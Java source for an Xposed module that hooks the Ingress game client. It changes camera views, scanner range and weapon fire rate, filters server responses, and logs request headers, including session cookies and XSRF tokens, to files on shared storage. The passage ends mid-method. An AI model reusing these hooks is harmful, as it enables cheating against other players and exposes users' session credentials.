package com.example.xposedtesting;

import android.app.AndroidAppHelper;
import android.content.Context;
import android.graphics.Typeface;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XSharedPreferences;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.net.URI;
import java.util.*;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

import static de.robv.android.xposed.XposedHelpers.*;

public class Ingress extends DefaultAbstractApp {

    private static boolean loaded;

    public void prepare(final XC_LoadPackage.LoadPackageParam lpparam) {
        if (!pref.getBoolean("enabled", false)) {
            logger.log("Ingress: disabled, not hooking...");
            return;
        }
        loaded = false;

        logger.log("Preparing Ingress: hookBadlogicCameraView");
        hookBadlogicCameraView(lpparam);
        logger.log("Preparing Ingress: hookIngressNet");
        hookIngressNet(lpparam);
        logger.log("Preparing Ingress: hookIngressScanner");
        hookIngressScanner(lpparam);
        logger.log("Prepare Ingress success!");
        logger.debugLog("INGRESS: DEBUG ENABLED!!!");
    }

    private void hookBadlogicCameraView(final XC_LoadPackage.LoadPackageParam lpparam) {

        final Class<?> perspectiveCamera = findClass("com.badlogic.gdx.graphics.PerspectiveCamera", lpparam.classLoader);
        try {
//            hookAllMethodsWithName(findClass("com.badlogic.gdx.math.Matrix4", lpparam.classLoader), "setToProjection", false);
//            hookAllMethodsWithName(findClass("com.badlogic.gdx.math.Matrix4", lpparam.classLoader), "setToOrtho", false);
//            hookAllMethodsWithName(findClass("com.badlogic.gdx.math.Matrix4", lpparam.classLoader), "setToTranslation", false);
//            hookAllMethodsWithName(findClass("com.badlogic.gdx.math.Matrix4", lpparam.classLoader), "setToOrtho2D", false);
            findAndHookMethod(perspectiveCamera, "update", boolean.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }

                    //get all real game params
                    Float near, far, fieldOfView, viewportWidth, viewportHeight;
                    Float directionX, directionY, directionZ, oldDirectionX, oldDirectionY, oldDirectionZ;
                    Float positionX, positionY, positionZ, oldPositionX, oldPositionY, oldPositionZ;
                    Float upX, upY, upZ, oldUpX, oldUpY, oldUpZ;
                    Float coeffX, coeffZ, coeffPref;
                    Object direction, position, up;

                    near = getFloatField(param.thisObject, "near");
                    far = getFloatField(param.thisObject, "far");
                    fieldOfView = getFloatField(param.thisObject, "fieldOfView");
                    viewportWidth = getFloatField(param.thisObject, "viewportWidth");
                    viewportHeight = getFloatField(param.thisObject, "viewportHeight");

                    direction = getObjectField(param.thisObject, "direction");
                    position = getObjectField(param.thisObject, "position");
                    up = getObjectField(param.thisObject, "up");

                    oldDirectionX = getFloatField(direction, "x");
                    oldDirectionY = getFloatField(direction, "y");
                    oldDirectionZ = getFloatField(direction, "z");
                    oldPositionX = getFloatField(position, "x");
                    oldPositionY = getFloatField(position, "y");
                    oldPositionZ = getFloatField(position, "z");
                    oldUpX = getFloatField(up, "x");
                    oldUpY = getFloatField(up, "y");
                    oldUpZ = getFloatField(up, "z");

                    logger.debugLog("PerspectiveCamera: props: near: " + near.toString() +     ", far: " + far.toString() +         ", fov: " + fieldOfView.toString() + ", width: " + viewportWidth.toString() + ", height: " + viewportHeight.toString());
                    logger.debugLog("PerspectiveCamera: dir: x: " + oldDirectionX.toString() + ", y: " + oldDirectionY.toString() + ", z: " + oldDirectionZ.toString());
                    logger.debugLog("PerspectiveCamera: pos: x: " + oldPositionX.toString() +  ", y: " + oldPositionY.toString() +  ", z: " + oldPositionZ.toString());
                    logger.debugLog("PerspectiveCamera: up : x: " + oldUpX.toString() +        ", y: " + oldUpY.toString() +        ", z: " + oldUpZ.toString());

                    //prepare to change params
                    //skip all non-default scanner views
                    if (near != 15f || far != 2048f || fieldOfView != 40f) {
                        return;
                    }
                    //skip deploy and recharge views, adjust cursor position on fire mode
                    //NORMAL: up 0.75953907, dir -0.6504616
                    //FIRE: up 0.6228586, dir -0.7823344
                    //DEPLOY: up 0.65962243, dir -0.75159717
                    //RECHARGE: up 0.72784215, dir -0.6857447
                    Integer roundedUpY = Math.round(oldUpY * 1000f);
                    Integer roundedDirectionY = Math.round(oldDirectionY * 1000f);
                    if (roundedUpY == 760 && roundedDirectionY == -650) {
                        coeffPref = pref.getFloat("coeffDefault", 0.6f);
                    } else if (roundedUpY == 623 && roundedDirectionY == -782) {
                        coeffPref = pref.getFloat("coeffFire", 0f);
                    } else if (roundedUpY == 660 && roundedDirectionY == -752) {
                        coeffPref = pref.getFloat("coeffDeploy", -0.42f);

                        //do nothing on deploy mode
                        return;
                    } else if (roundedUpY == 728 && roundedDirectionY == -686) {
                        coeffPref = pref.getFloat("coeffRecharge", 0.27f);

                        //and on recharge mode
                        return;
                    } else {
                        coeffPref = pref.getFloat("coeffDefault", 1f);
                    }


                    //set map scale
                    if (pref.getBoolean("scaleEnabled", false)) {
                        //link mode
                        if (oldDirectionX == 0f && roundedDirectionY == -1000 && oldDirectionZ == 0f) {
                            setFloatField(param.thisObject, "near", pref.getFloat("near4link", 15f));
                            setFloatField(param.thisObject, "far", pref.getFloat("far4link", 2048f));
                            setFloatField(param.thisObject, "fieldOfView", pref.getFloat("fov4link", 40f));

                            //dont mess other params
                            return;
                        } else {
                            setFloatField(param.thisObject, "near", pref.getFloat("near", 15f));
                            setFloatField(param.thisObject, "far", pref.getFloat("far", 2048f));
                            setFloatField(param.thisObject, "fieldOfView", pref.getFloat("fov", 40f));
                        }

                        near = getFloatField(param.thisObject, "near");
                        far = getFloatField(param.thisObject, "far");
                        fieldOfView = getFloatField(param.thisObject, "fieldOfView");
                        logger.debugLog("PerspectiveCamera: SET props: near: " + near.toString() + ", far: " + far.toString() + ", fov: " + fieldOfView.toString());
                    }

                    if (pref.getBoolean("posByUpEnabled", false)) {
                        coeffX = Math.abs(oldPositionX / oldUpX);
                        coeffZ = Math.abs(oldPositionZ / oldUpZ);

                        positionX = oldUpX * coeffX * coeffPref;
                        positionZ = oldUpZ * coeffZ * coeffPref;
                        logger.debugLog("PerspectiveCamera: SET pos by up(" + oldUpX.toString() + "," + oldUpZ.toString() + "): x"
                                + positionX.toString() + "(" + oldPositionX.toString() + "), z"
                                + positionZ.toString() + "(" + oldPositionZ.toString() + "), "
                                + "coeff" + "(" + coeffX.toString() + "," + coeffZ.toString() + ")");
                        setFloatField(position, "x", positionX);
                        setFloatField(position, "z", positionZ);
                    } else {
                        if (pref.getBoolean("upEnabled", false)) {
                            setFloatField(up, "x", pref.getFloat("upX", 0f));
                            setFloatField(up, "y", pref.getFloat("upY", 0f));
                            setFloatField(up, "z", pref.getFloat("upZ", 0f));

                            upX = getFloatField(up, "x");
                            upY = getFloatField(up, "y");
                            upZ = getFloatField(up, "z");
                            logger.debugLog("PerspectiveCamera: SET up : x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
                        }
                        if (pref.getBoolean("posEnabled", false)) {
                            setFloatField(position, "x", pref.getFloat("posX", 0f));
                            //camera height: can be changed by app
                            //setFloatField(position, "y", pref.getFloat("posY", 0f));
                            setFloatField(position, "z", pref.getFloat("posZ", 0f));

                            upX = getFloatField(position, "x");
                            upY = getFloatField(position, "y");
                            upZ = getFloatField(position, "z");
                            logger.debugLog("PerspectiveCamera: SET pos: x: " + upX.toString() + ", y: " + upY.toString() + ", z: " + upZ.toString());
                        }
                    }

                    //that is fucking map tilt!! DISABLE FOREVER!!
                    //should be set after posByUp, cuz directionY is used there
                    if (pref.getBoolean("dirEnabled", false)) {
                        setFloatField(direction, "x", pref.getFloat("dirX", 0f));
                        setFloatField(direction, "y", pref.getFloat("dirY", 0f));
                        setFloatField(direction, "z", pref.getFloat("dirZ", 0f));

                        directionX = getFloatField(direction, "x");
                        directionY = getFloatField(direction, "y");
                        directionZ = getFloatField(direction, "z");
                        logger.debugLog("PerspectiveCamera: SET dir: x: " + directionX.toString() + ", y: " + directionY.toString() + ", z: " + directionZ.toString());
                    }
                }
            });


        } catch (Throwable e) {
            logger.log("EXCEPTION in PerspectiveCamera: " + e.getMessage() + ", " + e.getClass().toString());
        }
    }

    private void hookIngressNet(final XC_LoadPackage.LoadPackageParam lpparam) {

//        hookAllMethods(findClass("o.u", lpparam.classLoader));
//        hookAllMethods(findClass("o.up", lpparam.classLoader));

        final Class<?> u = findClass("o.u", lpparam.classLoader);
        final Class<?> asu = findClass("o.asw", lpparam.classLoader);
        try {
            //public static InputStream \u02ca(final URI uri, final asu asu, final String s)
            findAndHookMethod(u, "ˊ", URI.class, asu, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    URI uri = (URI) param.args[0];
                    String body = (String) param.args[2];
                    logger.debugLog("s: req.uri: " + uri.toString());
                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-data.dat", true)));
                        file.println(uri.toString());
                        file.println(body);
                        file.println();
                        file.close();
                    } catch (IOException e) {
                        logger.log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }
        try {
            //public static void \u02ca(final HashMap<String, String> hashMap, final asu asu, final boolean b)
            findAndHookMethod(u, "ˊ", HashMap.class, asu, boolean.class, new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    String cookie = "";
                    String token = "";
                    HashMap<String, String> hm = (HashMap) param.args[0];
                    logger.debugLog("s: req.headers");
                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/request-headers.dat", true)));
                        for (HashMap.Entry entry : hm.entrySet()) {
                            file.println(entry.getKey() + ": " + entry.getValue());
                            if ("Cookie".equals(entry.getKey())) {
                                cookie = entry.getValue().toString();
                            } else if ("X-XsrfToken".equals(entry.getKey())) {
                                token = entry.getValue().toString();
                            }
                        }
                        file.println();
                        file.close();
                        if (!cookie.isEmpty() && !token.isEmpty()) {
                            //reportAuth(cookie, token);
                        }
                    } catch (IOException e) {
                        logger.log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }
        final Class<?> aln = findClass("o.ama", lpparam.classLoader);
        try {
            //public static InputStream \u02ca(final alx alx, final URI uri, final int n, final Map<String, List<String>> map, final InputStream inputStream, final String s)
            findAndHookMethod(u, "ˊ", aln, URI.class, int.class, Map.class, InputStream.class, String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                }

                @Override
                protected void afterHookedMethod(MethodHookParam param) throws IOException {
                    String regex = pref.getString("commFilter", "");
                    URI uri = (URI) param.args[1];
                    String uriString = uri.toString();
                    Integer httpCode = (Integer) param.args[2];
                    Map<String, List<String>> map = (Map) param.args[3];
                    String type = (String) param.args[5];
                    ByteArrayOutputStream inputData = new ByteArrayOutputStream();
                    if (param.getResult() == null) {
                        logger.debugLog("s: NULL input! resp.uri: " + uriString + ", resp.code: " + httpCode.toString() + ", type: " + type + ", size: " + inputData.size());
                    } else if (param.getResult().getClass() == GZIPInputStream.class) {
                        InputStream origIs = (InputStream) param.getResult();
                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = origIs.read(buffer)) != -1) {
                            inputData.write(buffer, 0, length);
                        }
                        byte[] inputDataBytes = inputData.toByteArray();
                        if (uriString.equals("https://m-dot-betaspike.appspot.com/rpc/gameplay/getPaginatedPlexts")) {
                            try {
                                JSONObject json = new JSONObject(inputData.toString());
                                JSONArray result = json.getJSONArray("result");
                                JSONArray resultFiltered = new JSONArray();
                                for (int i = 0; i < result.length(); i++) {
                                    JSONArray row = (JSONArray) result.get(i);
                                    JSONObject val = (JSONObject) row.get(2);
                                    String text = val.getJSONObject("plext").getString("text");
                                    Pattern pattern = Pattern.compile(regex, Pattern.DOTALL | Pattern.MULTILINE);
                                    if (pattern.matcher(text).find()) {
                                        logger.debugLog("COMM text filtered: " + text);
                                        continue;
                                    }
                                    resultFiltered.put(row);
                                }
                                json.put("result", resultFiltered);
                                inputDataBytes = json.toString().getBytes();
                            } catch (Throwable e) {
                                logger.log("JSON EXCEPTION " + e.getMessage());
                            }
                        } else if (uriString.equals("https://m-dot-betaspike.appspot.com/rpc/gameplay/collectItemsFromPortalWithGlyphResponse")) {
                            try {
                                JSONObject json = new JSONObject(inputData.toString());
                                JSONArray displayNames = json.getJSONObject("result").getJSONObject("glyphResponse").getJSONArray("displayNames");
                                JSONArray glyphResponses = json.getJSONObject("result").getJSONObject("glyphResponse").getJSONArray("glyphResponses");
                                String names = "";
                                for (int i=0; i < displayNames.length(); i++) {
                                    if ((Boolean) glyphResponses.get(i)) {
                                        names += "+ " + displayNames.get(i) + "\n";
                                    } else {
                                        names += "- " + displayNames.get(i) + "\n";
                                    }
                                }

                                final String finalNames = names;
                                new Handler(Looper.getMainLooper()).post(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(AndroidAppHelper.currentApplication(), finalNames.trim(), Toast.LENGTH_LONG).show();
                                    }
                                });

                            } catch (Throwable e) {
                                logger.log("JSON EXCEPTION " + e.getMessage());
                            }
                        } else if(uriString.equals("https://m-dot-betaspike.appspot.com/rpc/gameplay/getObjectsInCells") && pref.getBoolean("noFields", false)) {
                            try {
                                JSONObject json = new JSONObject(inputData.toString());
                                JSONArray result = json.getJSONObject("gameBasket").getJSONArray("gameEntities");
                                JSONArray resultFiltered = new JSONArray();
                                for (int i = 0; i < result.length(); i++) {
                                    JSONArray row = (JSONArray) result.get(i);
                                    JSONObject val = (JSONObject) row.get(2);
                                    if (val.has("capturedRegion")) {
                                        continue;
                                    }
                                    resultFiltered.put(row);
                                }
                                json.put("result", resultFiltered);
                                inputDataBytes = json.toString().getBytes();
                            } catch (Throwable e) {
                                logger.log("JSON EXCEPTION " + e.getMessage());
                            }
                        }

                        BufferedInputStream fakeIs = new BufferedInputStream(new ByteArrayInputStream(inputDataBytes));
                        param.setResult(fakeIs);
                    } else {
                        logger.debugLog("s: input stream: NOT GZIP! " + param.getResult().toString());
                    }
                    logger.debugLog("s: resp.uri: " + uriString + ", resp.code: " + httpCode.toString() + ", type: " + type + ", size: " + inputData.size());

                    try {
                        PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/ingress/response.dat", true)));
                        file.println(uriString);
                        for (Map.Entry<String, List<String>> entry : map.entrySet()) {
                            for (String oneString : entry.getValue()) {
                                if (entry.getKey() == null) {
                                    file.println(oneString);
                                } else {
                                    file.println(entry.getKey() + ": " + oneString);
                                }
                            }
                        }
                        file.println();
                        file.println(inputData.toString());
                        file.println();
                        file.println();
                        file.close();
                    } catch (IOException e) {
                        logger.log("Failed writing to file: " + e.getMessage());
                    }
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
        }

//        final Class<?> up = findClass("o.up", lpparam.classLoader);
//        final Class<?> tp = findClass("o.tp", lpparam.classLoader);
//        try {
//            findAndHookConstructor(up, tp, String.class, new XC_MethodHook() {
//                @Override
//                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                    logger.debugLog("up: construct: `" + param.args[0].toString() + "`, `" + param.args[1].toString() + "`");
//                }
//            });
//        } catch (Throwable e) {
//            logger.log("EXCEPTION in IngressNet: " + e.getMessage() + ", " + e.getClass().toString());
//        }
    }

    private void hookIngressScanner(final XC_LoadPackage.LoadPackageParam lpparam) {
        final XSharedPreferences pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");

        try {
            try {
                findAndHookMethod(ClassLoader.class, "loadClass", String.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        String className = param.args[0].toString();
                        if (!loaded) {
                            if (!className.equals("o.tw")) {
                                return;
                            }
                            Class paramClass = (Class)param.getResult();
                            try {
                                //final Class<?> tu = findClass("o.tu", lpparam.classLoader);
                                final Class<?> GameplayRpcParams = findClass("com.nianticproject.ingress.shared.rpc.GameplayRpcParams", lpparam.classLoader);
                                try {
                                    findAndHookMethod(paramClass, "ˊ", GameplayRpcParams, boolean.class, boolean.class, long.class, new XC_MethodHook() {
                                        @Override
                                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                                            logger.debugLog("blob check before call: " + param.args[0].getClass() + ", " + param.args[1].toString() + ", " + param.args[2].toString() + ", " + param.args[3].toString());
                                        }
                                        @Override
                                        protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                                            Object clientBlob = callMethod(param.args[0], "ˊ");
                                            logger.debugLog("blob check after call: " + clientBlob.toString());
                                        }
                                    });
                                    logger.log("dynamic class tu hooked successfully!!!");
                                    loaded = true;
                                } catch (Throwable e) {
                                    logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
                                }
                            } catch (Throwable e) {
                                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
                            }
                        }
                    }
                });
            } catch (Throwable e) {
                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
            }
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }


        try {
            final Class<?> ac = findClass("o.ac", lpparam.classLoader);
            try {
                findAndHookMethod(ac, "ˊ", int.class, boolean.class, long.class, int.class, new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                        logger.debugLog("blob generate: params: " + param.args[0].toString() + ", " + param.args[1].toString() + ", " + param.args[2].toString() + ", " + param.args[3].toString());
                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        String bytesString;
                        if (param.getResult() == null) {
                             bytesString = "NULL";
                        } else {
                            bytesString = (String)param.getResult();
                        }
                        logger.debugLog("blob generate: result: " + "(bytes)" + ", length: " + bytesString.length() + ", data: " + bytesString);
                    }
                });
            } catch (Throwable e) {
                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
            }
        }catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

//native blob generation
//        try {
////            final Class<?> aqw = findClass("o.aqw", lpparam.classLoader);
////            final Class<?> ac = findClass("o.ac", lpparam.classLoader);
//            final Class<?> Native = findClass("com.nianticproject.ingress.common.utility.Native", lpparam.classLoader);
//
//            try {
//                findAndHookMethod(Native, "r", long.class, byte[].class, int.class, long.class, new XC_MethodHook() {
//                    @Override
//                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                        byte[] bytes = (byte[]) param.args[1];
//                        String bytesString = Base64.encodeToString(bytes, Base64.NO_WRAP);
//
//                        logger.debugLog("blob generate: native params: " + param.args[0].toString() + ", " + "(bytes)" + ", " + param.args[2].toString() + ", " + param.args[3].toString() + ", bytes length: " + bytes.length + "/" + bytesString.length() + ", data: " + bytesString);
//                    }
////                    @Override
////                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
////                        byte[] bytes = (byte[]) param.getResult();
////                        String bytesString = Base64.encodeToString(bytes, Base64.NO_WRAP);
////                        logger.log("blob generate: native result: " + "(bytes)" + ", length: " + bytes.length + "/" + bytesString.length() + ", data: " + bytesString);
////                    }
//                });
//            } catch (Throwable e) {
//                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
//            }
//
//        }catch (Throwable e) {
//            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
//        }





//just their own base64 converter
/*
        try {
            findAndHookMethod(aqw, "ˋ", byte[].class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    byte[] bytes = (byte[]) param.args[0];
                    String bytesString = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    logger.log("blob base64 args: " + bytesString + ", length: " + bytes.length + "/" + bytesString.length());
                }
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    String result = (String)param.getResult();
                    logger.log("blob base64 result: " + result + ", length: " + result.length());
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

*/

//returns com.nianticproject.ingress.common.utility.Native
/*
        try {
            findAndHookMethod(ac, "ˊ", byte.class, byte.class, byte.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    byte byte0 = (byte)param.args[0];
                    byte byte1 = (byte)param.args[1];
                    byte byte2 = (byte)param.args[2];
                    logger.log("blob base64 reflection before call: " + Integer.toHexString(byte0) + " "  + Integer.toHexString(byte1) + " " + Integer.toHexString(byte2));
                }
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    logger.log("blob base64 reflection after call: " + param.getResult());
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }
*/

//returns the same class
/*
        try {
            final Class<?> anzSu10eb = findClass("o.anz$ძ", lpparam.classLoader);
            try {
                findAndHookMethod(anzSu10eb, "U", String.class, new XC_MethodHook() {
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        Class result = (Class)param.getResult();
                        logger.log("anz.U: CLASS: " + result.getName() + ", requested: " + param.args[0]);
                    }
                });
            } catch (Throwable e) {
                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
            }
        }catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }
*/





        //internal ingress logging (nothing interesting)
        try {
            final Class<?> Logger = findClass("java.util.logging.Logger", lpparam.classLoader);
            final Class<?> Level = findClass("java.util.logging.Level", lpparam.classLoader);
            try {
                findAndHookMethod(Logger, "isLoggable", Level, new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    }
                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        boolean isLoggable = (boolean)param.getResult();
                        if (!isLoggable) {
//                            logger.log("Overridden Logger.isLoggable:false");
//                            param.setResult(true);
                        }
                    }
                });
            } catch (Throwable e) {
                logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
            }
        }catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //scanner draw radius
        final Class<?> r = findClass("o.r", lpparam.classLoader);
        try {
            //public static ScannerKnobs \u141d()
            findAndHookMethod(r, "ᐝ", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }
                    Object scannerKnobs = param.getResult();
                    setIntField(scannerKnobs, "rangeM", pref.getInt("scannerRangeM", 300));
                    param.setResult(scannerKnobs);
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }
        //max weapon rate
        try {
            //public static ClientWeaponKnobBundle \u02bc()
            findAndHookMethod(r, "ʼ", new XC_MethodHook() {
                @Override
                protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    if (debug) {
                        pref.reload();
                    }
                    Object clientWeaponKnobBundle = param.getResult();
                    setFloatField(clientWeaponKnobBundle, "maxFireRateSeconds", pref.getFloat("maxFireRateSeconds", 1.5f));
                    param.setResult(clientWeaponKnobBundle);
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //disable disabling immersive move when opening COMM
        final Class<?> avp = findClass("o.avr", lpparam.classLoader);
        try {
            //this.\u02cf.getWindow().getDecorView().setSystemUiVisibility(256);
            findAndHookMethod(avp, "ʼ", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    param.setResult(null);
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //FPS debug ??
        try {
            final Class<?> aig = findClass("o.aig", lpparam.classLoader);
            final Class<?> vv = findClass("o.vv", lpparam.classLoader);
            findAndHookConstructor(aig, int.class, boolean.class, vv, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    logger.log("FPS: hooked constructor, params: " + param.args[0].toString() + ", " + param.args[1].toString());
                    if (pref.getBoolean("fpsCounter", false)) {
                        param.args[1] = true;
                    }
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }


        //do not wrap "uncaptured" to "unca..."
        try {
            final Class<?> aju = findClass("o.ajx", lpparam.classLoader);
            //    private String \u02ca(final String s, final int n) {
            findAndHookMethod(aju, "ˊ", String.class, int.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    if (param.args[0].equals("uncaptured")) {

                        param.setResult(param.args[0]);
                    }
                }
            });
        } catch (Throwable e) {
            logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
        }

        //highlight nicknames for certain players
        try {
            final Class<?> aju = findClass("o.ajx", lpparam.classLoader);
            final Class<?> akq = findClass("o.akt", lpparam.classLoader);
            final Class<?> NativeLabelStyle = findClass("com.nianticproject.ingress.common.ui.widget.NativeLabel$NativeLabelStyle", lpparam.classLoader);
            final Class<?> NativeLabel = findClass("com.nianticproject.ingress.common.ui.widget.NativeLabel", lpparam.classLoader);
            final Class<?> Color = findClass("com.badlogic.gdx.graphics.Color", lpparam.classLoader);
            final Class<?> Actor = findClass("com.badlogic.gdx.scenes.scene2d.Actor", lpparam.classLoader);
            final Class<?> Table = findClass("com.badlogic.gdx.scenes.scene2d.ui.Table", lpparam.classLoader);
            final Class<?> Image = findClass("com.badlogic.gdx.scenes.scene2d.ui.Image", lpparam.classLoader);
            final Class<?> Team = findClass("com.nianticproject.ingress.shared.Team", lpparam.classLoader);
            final Class<?> ajt = findClass("o.ajw", lpparam.classLoader);

            findAndHookMethod(aju, "ˊ", String.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    String hookedClass = param.thisObject.getClass().toString();
                    String label = param.args[0].toString();
                    if (label.equals("alexbilevskiy") || label.equals("vl309")) {
                        Object color = getObjectField(param.thisObject, "color");
                        Float a,r,g,b, newA, newR, newG, newB;
                        a = getFloatField(color, "a");
                        r = getFloatField(color, "r");
                        g = getFloatField(color, "g");
                        b = getFloatField(color, "b");
                        newA = 1.0f;
                        newR = 1.0f;
                        newG = 0.0f;
                        newB = 0.0f;
                        String name = (String) getObjectField(param.thisObject, "name");
                        Float width = (Float) getFloatField(param.thisObject, "width");
                        if (label.equals("vl309")) {
                            newG = 1.0f;
                        }
                        if (a.equals(newA) && r.equals(newR) || width == pref.getFloat("portal_owner_nickname_width", 24.0f)) {
                            logger.debugLog("SET setText `" + label + "` in " + hookedClass + "(" + name + ", " + width.toString() + ")" + ", color: " + a.toString() + ", " + r.toString() + ", " + g.toString() + ", " + b.toString() + ", SKIPPING");

                            return;
                        }
                        logger.debugLog("SET setText `" + label + "` in " + hookedClass  + "(" + name + ", " + width.toString() + ")" + ", color: " + a.toString() + ", " + r.toString() + ", " + g.toString() + ", " + b.toString());

                        incrementMethodDepth(depthKey);
                        callMethod(param.thisObject, "setColor", newR, newG, newB, newA);
                        decrementMethodDepth(depthKey);

                        return;
                    }
                    logger.debugLog("SET setText `" + label + "` in " + hookedClass);
                }
            });


            //hookAllMethods(aju);


//            findAndHookMethod(Actor, "setColor", Color, new XC_MethodHook() {
//                @Override
//                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
//                    if (getMethodDepth(depthKey) > 1) {
//                        return;
//                    }
//                    Class<?> hookedClass = param.thisObject.getClass();
//                    if (hookedClass.equals(Table) || hookedClass.equals(Image) || hookedClass.equals(ajt) || hookedClass.equals(NativeLabel)) {
//                        return;
//                    }
//                    if (hookedClass.equals(aju)) {
//                        String label = getObjectField(param.thisObject, "ʾ").toString();
//                        if (label.equals("5391fb18942c45e6b3f7a37e53f82fc9.c")) {
//                            logger.log("REPLACED setColor for `" + label + "` " + hookedClass.toString());
//                            incrementMethodDepth(depthKey);
//                            callMethod(param.thisObject, "setColor", 1.0f, 0.0f, 0.0f, 1.0f);
//                            decrementMethodDepth(depthKey);
//
//                            param.setResult(null);
//                        } else {
//                            logger.log("hooked setColor for `" + label + "` " + hookedClass.toString());
//                        }
//                    }
//                    if (hookedClass.equals(akq)) {
//                        String label = (String)getObjectField(param.thisObject, "ʿ");
//                        if (label != null && (label.equals("5391fb18942c45e6b3f7a37e53f82fc9.c") || label.equals("alexbilevskiy"))) {
//                            logger.log("REPLACED setColor for `" + label + "` " + hookedClass.toString());
//                            incrementMethodDepth(depthKey);
//                            callMethod(param.thisObject, "setColor", 1.0f, 0.0f, 0.0f, 1.0f);
//                            decrementMethodDepth(depthKey);
//
//                            param.setResult(null);
//                        } else {
//                            logger.log("hooked setColor for `" + label + "` " + hookedClass.toString());
//                        }
//                    }
//                }
//            });

            findAndHookMethod(Actor, "setColor", float.class, float.class, float.class, float.class, new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    if (getMethodDepth(depthKey) > 0) {
                        return;
                    }
